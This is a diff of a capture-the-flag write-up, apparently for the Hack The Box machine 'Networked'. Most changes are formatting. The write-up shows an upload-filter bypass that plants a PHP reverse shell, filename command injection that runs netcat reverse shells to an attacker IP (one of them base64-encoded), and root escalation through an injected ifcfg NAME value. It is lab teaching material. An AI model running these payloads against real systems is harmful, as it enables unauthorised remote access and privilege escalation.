@@ -10,8 +10,8 @@ image:
   height: 400   # in pixels
 ---
 
-
 # Overview 
+
 This machine begins w/ a web enumeration, discovering a page where users can **only** upload images onto the system due to the filters in place, however it can be bypassed by changing the content type (1), filename (2) and adding a GIF header (3), allowing us to upload  `php-reverse-shell.php`, obtaining a low-privilege/`www-data` shell.
 
 For the privilege escalation part, we have to privilege escalate to `guly` and then to `root`. After some enumeration, there is a cronjob that is executing a script `check_attack.php` as `guly`.  The purpose of that script is to check if files in `/var/www/html/uploads` have a valid IP address in its name, otherwise delete it. The script is vulnerable to command injection due to passing user input directly into `exec()`, privilege escalating us to user `guly`.
@@ -23,19 +23,20 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 ---
 
 | Column       | Details                                                    |
-| ------------ | ---------------------------------------------------------- |
-| Box Name     | Networked                                                           |
+|--------------|------------------------------------------------------------|
+| Box Name     | Networked                                                  |
 | IP           | 10.10.10.146                                               |
 | Points       | 20                                                         |
 | Difficulty   | Easy                                                       |
 | Creator      | [guly](https://www.hackthebox.com/home/users/profile/8292) |
 | Release Date | 24-Aug-2019                                                |
 
-
 # Recon
 
 ## TCP/80 (HTTP)
+
 - FFUF
+
 ```
 301      GET        7l       20w      235c http://10.10.10.146/backup => http://10.10.10.146/backup/
 403      GET        8l       22w      210c http://10.10.10.146/cgi-bin/
@@ -46,16 +47,16 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 200      GET        5l       13w      169c http://10.10.10.146/upload.php
 301      GET        7l       20w      236c http://10.10.10.146/uploads => http://10.10.10.146/uploads/
 ```
+
 - `lib.php`
 - `photos.php`
 - `upload.php`
 - `uploads/`
 
-
-
 # Initial Foothold
 
 ## TCP/80 (HTTP) - File Upload Bypass
+
 1. After some testing at `http://10.10.10.146/upload.php`, 
 		![](Pasted%20image%2020220913004647.png)
 	- `.php` - unable to upload
@@ -64,6 +65,7 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 2. Attempt file [upload bypass](https://yufongg.github.io/posts/Upload-bypass/)
 	1. Upload `php-reverse-shell.php`, intercept w/ `burp`
 	2. Change POST data
+
 		```
 		Content-Disposition: form-data; name="myFile"; filename="php-reverse-shell.php.jpg"
 		Content-Type: image/jpg
@@ -72,19 +74,26 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		<?php
 		...
 		```
+
 		![](Pasted%20image%2020220913020708.png)
+
 3. Invoke reverse shell
+
 	```
 	┌──(root💀kali)-[~/htb/networked]
 	└─# curl http://networked.htb/uploads/10_10_14_19.php.jpg
 	```
+
 	![](Pasted%20image%2020220913020924.png)
+
 4. If you want to practice this exact upload bypass, try Vulnhub Pwnlab
 
 # Privilege Escalation
 
 ## Guly - Enumeration 
+
 1. Found something interesting in `/home/guly`
+
 	```
 	bash-4.2$ ls -la /home/guly                                          
 	total 28                                                             
@@ -99,12 +108,14 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly                
 	-r--------. 1 guly guly  33 Oct 30  2018 user.txt   
 	```
+
 	- `crontab.guly`
 	- `check_attack.php`
 2. View `check_attack.php`
 	![](Pasted%20image%2020220913021555.png)
 
 ## Guly - What is check_attack.php doing?
+
 1. What is check_attack.php doing? - TLDR
 	1. Once a files is uploaded, its name is changed to the IP address of the machine that uploaded the file. Instead of `'.'`, `'_'` is used. `10_10_14_14.jpg`
 	2. Basically, it checks if the files in `/var/www/html/uploads` whether their name is a valid IP address, if it is, do nothing, if isn't append a warning into a log file and then delete the invalid file.
@@ -114,18 +125,20 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	3. The `check_ip($name, $value)` function just checks whether the variable `$name` (`10.10.10.14`) is a valid IP address, if not returns `ret=false`, which means `$check[0]` is NULL.
 	4. If `$check[0]` is NULL, append message to log, remove invalid file and mail. (This part is vulnerable)
 
-
-
 ## Guly - Exploiting check_attack.php 
+
 1. How do we exploit `check_attack.php`? (1)
 	1. We are only interested in `exec(...)` because it is code execution.
+
 		>  `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");` is vulnerable because `$value` is passed into `exec`
 		{: .prompt-info }
+
 	2. The variable `$value` are files residing in `/var/www/html/uploads/<file>`
 	3.  In order to get to the `exec(...)` statement, we simply just have to create a file that is `!= 10_10_10_10.png`, not a valid IP Address.
 	
 2. How do we exploit `check_attack.php`? (2)
 	1. We are able to do command injection by naming the files in `uploads` directory commands we want to execute
+
 		```
 		# Create our Command Injection Payload
 		touch "/var/www/html/uploads/<Command Injection Payload>"
@@ -139,18 +152,21 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		exec("nohup /bin/rm -f /var/www/html/uploads$value > /dev/null 2>&1
 		exec("nohup /bin/rm -f /var/www/html/uploads;id;whoami;whoami > /dev/null 2>&1
 		```
-	4. Create payload
-		> 1. Commands we would want to inject will be a reverse shell, most reverse shell requires the character `/`, however, it is not possible to create a file w/ `/` in its filename.
-		> 2. Bypass/Overcome the restriction 
+
+	2. Create payload
+
+		> 3. Commands we would want to inject will be a reverse shell, most reverse shell requires the character `/`, however, it is not possible to create a file w/ `/` in its filename.
+		> 4. Bypass/Overcome the restriction 
 			> - We can `base64` encode the payload and then decode it pip it in `sh`
 			> - Use `$(which bash)`
-		> 3. Our command injection payload is directed into `/dev/null`, 
-		> 4. Bypass/Overcome the restriction 
+		> 5. Our command injection payload is directed into `/dev/null`, 
+		> 6. Bypass/Overcome the restriction 
 			> - simply add a random command (`;id`) so that that command will be passed to `/dev/null` instead.
 
-3. Exploiting `check_attack.php`
+7. Exploiting `check_attack.php`
 	1. Monitor when `check_attack.php` is executed w/ `pspy64`
 	2. Create our command injection file (1)
+
 		```
 		bash-4.2$ pwd
 		/var/www/html/uploads
@@ -168,6 +184,7 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		-rw-rw-rw-  1 apache apache     0 Sep 12 23:02 ;nc 10.10.14.19 4444 -e $(which bash);id
 		-r--r--r--. 1 root   root       2 Oct 30  2018 index.html
 		```
+
 	3. Start listener
 	4. Wait for cronjob to execute
 		![](Pasted%20image%2020220913050342.png)
@@ -175,18 +192,22 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		![](Pasted%20image%2020220913050514.png)
 	6. Create our command injection file (2)
 		1. Encode Payload
+
 			```
 			bash-4.2$ echo 'nc 10.10.14.19 4444 -e /bin/bash' | base64
 			bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK
 			```
-		1. Create file
+
+		2. Create file
+
 			```
 			bash-4.2$ bash-4.2$ touch ';echo bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | sh; id'
 			```
+
 	7. Start listener
 	8. Wait for cronjob to execute
 		![](Pasted%20image%2020220913055843.png) 
-4. Demo - `check_attack.php` Privilege Escalation
+8. Demo - `check_attack.php` Privilege Escalation
 	<html>
 	<head>
 	<link rel="stylesheet" type="text/css" href="/asciinema-player.css" />
@@ -204,7 +225,9 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	</html>
 
 ## Root - Enumeration
+
 1. Check `guly` sudo access
+
 	```
 	[guly@networked tmp]$ sudo -l
 	Matching Defaults entries for guly on networked:
@@ -219,11 +242,13 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	User guly may run the following commands on networked:
 	    (root) NOPASSWD: /usr/local/sbin/changename.sh
 	```
+
 	- `/usr/local/sbin/changename.sh`
 2. View contents of `/usr/local/sbin/changename.sh`
 	![](Pasted%20image%2020220913190525.png)
 
 ## Root - What is changename.sh doing?
+
 1. What is changename.sh doing - TLDR
 	- Basically, `changename.sh` is a script that allow users to configure parameters on a network interface file called `ifcfg-guly` by taking their input 
 2. Breaking down what `changename.sh` is doing
@@ -233,27 +258,34 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	4. Writes user input into `ifcfg-guly`
 	5. Starts interface `guly0`
 
-
 ## Root - Exploiting changename.sh
+
 1. After analyzing `changename.sh`, I could not find any way to do command injection, `echo "$var"` is usually safe, so command injection is not possible.
 2. Instead, I googled, `ifcfg privilege escalation`, and found something interesting.
 3. How do we exploit `changename.sh` - [source](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 	1. The vulnerability resides in how attributes in network scripts are not handled correctly
 	2. If there are whitespaces in the attribute name, `system` will try to execute the word after the white space.
+
 		```
 		NAME=testing whoami
 		# whoami will be executed by system as root
 		```
+
 	3. Spawn `root` shell
+
 		```
 		a /bin/bash
 		```
+
 4. Exploiting `changename.sh`
 	1. Execute `changename.sh` as root
+
 		```
 		[guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
 		```
+
 	2. Spawn `bash`, privilege escalating to `root`
+
 		```
 		[guly@networked tmp]$ sudo /usr/local/sbin/changename.sh
 		interface NAME:
@@ -266,6 +298,7 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		a /bin/bash
 		[root@networked network-scripts]# 
 		```
+
 5. Demo - `changename.sh` Privilege Escalation
 	<html>
 	<head>
@@ -283,13 +316,12 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	</body>
 	</html>
 
-
-
-
 # Additional
 
 ## Guly -  What is check_attack.php doing? (In-Depth)
+
 1. Assign some variables
+
 	```
 	# Line 2-7
 	require '/var/www/html/lib.php';
@@ -299,16 +331,21 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	$msg= '';
 	$headers = "X-Mailer: check_attack.php\r\n";
 	```
+
 2. Create an empty array called `files`
+
 	```
 	# Line 9
 	$files = array();
 	```
+
 3. Populate array w/  files in `/var/www/html/uploads`
+
 	```
 	# Line 10
 	$files = preg_grep('/^([^.])/', scandir($path));
 	```
+
 	```
 	# Testing what is Line 10 doing
 	
@@ -338,7 +375,9 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	test.png
 	testing_123.png
 	```
+
 4. In this for loop, and if statement
+
 	```
 	# Line 12-16
 	foreach ($files as $key => $value) {
@@ -347,10 +386,12 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 			continue;
 	  }
 	```
+
 	1. Values in `$files` array are stored in `$key` and assign `$key` to `$value`
 	2. If `$value == index.html`, go right back to the loop instead of proceeding to line 20 onwards.
 	3. The purpose is to exclude `index.html`, from code (Line 20 onwards) 
 5. Pass `$value` into `getNameCheck` function
+
 	```
 	# $filename = 10_10_14_19.png
 	# Screenshots are for "safe/not attacks" file (10_10_14_19.png)
@@ -364,6 +405,7 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	  return array($name,$ext);
 	}
 	```
+
 	1. Separates the filename into parts by `.`
 		- for e.g. `10_10_14_19.png`
 		- `$pieces[0] = 10_10_14_19.png`
@@ -380,11 +422,15 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		![](Pasted%20image%2020220913034649.png)
 	5. Return `array($name,$ext)`
 6. Store array into list
+
 	```
 	list ($name,$ext) = getnameCheck($value);	
 	```
+
 	![](Pasted%20image%2020220913041721.png)
+
 7. Pass `$name, $value` into `check_ip` function
+
 	```
 	# $name  = 10.10.14.19      = $prefix
 	# $value = 10_10_14_19.png  = $filename
@@ -400,6 +446,7 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	  return array($ret,$msg);
 	}
 	```
+
 	1. Set `$ret = true`
 	2. If IP Address is invalid, 
 		- `$ret = false`  
@@ -413,6 +460,7 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		- Valid IP: `array(1,"10_10_14_19.png")`
 		- Invalid IP: `array(false,"4tt4ck on file 10_10_14_19.png: prefix is not a valid ip")`
 8. If the first value in array `$check` is `false`
+
 	```
 	  if (!($check[0])) {
 		echo "attack!\n";e
@@ -424,6 +472,7 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		mail($to, $msg, $msg, $headers, "-F$value");
 	  }
 	```
+
 	1. Prints `"attack"`
 	2. Append `$msg`  into `/tmp/attack.log`
 	3. Remove `/tmp/attack.log`
@@ -431,7 +480,9 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	5. Prints `"rm -f $path$value"`
 
 ## What is changename.sh doing? (In-Depth)
+
 1. It is assigning some variables and **writing** it into `/etc/sysconfig/network-scripts/ifcfg-guly`
+
 	```
 	cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
 	DEVICE=guly0
@@ -439,7 +490,9 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	NM_CONTROLLED=no
 	EoF
 	```
+
 2. Create a regex rule
+
 	```
 	regexp="^[a-zA-Z0-9_\ /-]+$"
 
@@ -453,9 +506,12 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 	7. The character '-' 
 	8. One or MORE times
 	```
+
 	![](Pasted%20image%2020220913192306.png)
+
 3. In every `for` loop,
 	1. Create variable `$var`, assign it to `NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO` in each loop
+
 		```
 		# Loop1:
 		$var = NAME
@@ -469,7 +525,9 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		# Loop4
 		$var = BOOTPROTO
 		```
+
 	2. Print `$var` in each loop
+
 		```
 		# Example:
 		
@@ -480,13 +538,15 @@ If you wish to practice boxes similar to this, try VulnHub PwnLab
 		BROWSER_ONLY
 		BOOTPROTO
 		```
-	1. Accept user input
-	2.  Goes into a `while` loop If user input does not match regex expression,
+
+	3. Accept user input
+	4.  Goes into a `while` loop If user input does not match regex expression,
 			1. Print "wrong input..." 
 			2. Print  `$var`
 			3. Accept user input again **until user input matches regex expression**.
-	3. Appends output of `$var=<user input>`  into `ifcfg-guly` in each loop
+	5. Appends output of `$var=<user input>`  into `ifcfg-guly` in each loop
 4. Bring interface `guly0` up.
+
 	```
 	/sbin/ifup guly0
 	```
